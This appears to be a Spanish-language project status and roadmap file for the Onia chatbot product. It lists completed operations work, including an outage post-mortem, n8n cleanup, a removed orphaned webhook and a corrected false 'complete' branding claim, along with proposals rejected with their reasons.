- [x] **Insistencia** con perilla en el panel y barrido por cron
      (`hermes-content/deploy/vps-ops/bot/insistencia-run.mjs`), **push "te escribieron"**
      (`lib/chatbot/push-te-escribieron.ts`) y **frases de campaña** (deploy `e5c1ad3`).
- [x] **El motor estuvo caído 4 días** (24 al 28-ago) y volvió: `/tmp/onia-bot` a medias +
      la excepción de firewall perdida en el reboot. Las dos causas están auto-curadas desde
      `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh`.
- [x] **Canario de auth** cada 5 min, **n8n saneado** (4 workflows con claves vivas
      redactados y archivados, 27 inactivos archivados) y el **webhook de Cal.com
      despublicado** — estaba huérfano y aceptaba POSTs forjados.
      🔴 **De esta línea SE SACÓ "Branding de Chatwoot completo (seis configs)" el 2026-08-31
      (séptima vuelta): era falso, y medido desde la calle.** Un `[x]` que dice *completo*
      sobre algo que está roto en producción es el fantasma exacto que este carril mide, y
      éste llevaba **quince días**. No son seis configs sino nueve, y tres —`BRAND_URL`,
      `TERMS_URL`, `PRIVACY_URL`— dicen `www.chatwoot.com` en el HTML público de
      `https://chat.onia.com.bo/app/login` desde el **16-ago**. Verificado hoy con un `curl`
      a la página, no leyendo la base:
      `"BRAND_URL":"https://www.chatwoot.com"`. La parte que SÍ está bien y por eso no se
      borra entera: logo, `BRAND_NAME`, `INSTALLATION_NAME` y el `WIDGET_BRAND_URL` del pie
      del widget siguen siendo los de Onia. **Lo pendiente vive en el ítem de "Después"
      (`Vigilar que el reconcile…`) y en S10**, que es donde tiene que estar mientras siga
      roto.

---

## Rechazado, con motivo — no volver a proponerlo

- **Difusiones masivas** (el último hueco contra Sendy). Necesita plantillas de Meta
  **aprobadas por cada org** y tiene costo por mensaje a partir del 1-oct-2026, cuando se
  cierra la ventana gratis de 24 h. Construirlo sin un cliente que lo pida es especificar a
  ciegas un flujo cuyo costo todavía no conocemos. **Se reabre el día que un cliente lo pida**,
  y ahí se especifica con su caso.
- **Un escalón de precio más barato "sólo widget web"**. Ya decidido: Bs 390 plano todo
  incluido (`lib/pricing.ts:23`). Reabrirlo es desandar una decisión de Sergio del 30-ago
  tomada con la comparativa de mercado en la mano.
- **Apagar los workflows de n8n que avisan por Telegram.** Hacen trabajo real: apagarlos para
  bajar ruido rompe la automatización para arreglar una notificación. Lo que corresponde es
  editar el nodo de aviso de cada uno — y eso espera la decisión S5.
- **Un modelo local para la visión del bot.** Sergio ya lo descartó el 30-ago con el motivo
  escrito: *"pagamos api nomás de modelo barato"* — ollama ya estranguló el VPS una vez
  (steal 93%, load 158). El costo medido de la API es US$ 0,0007 por imagen.
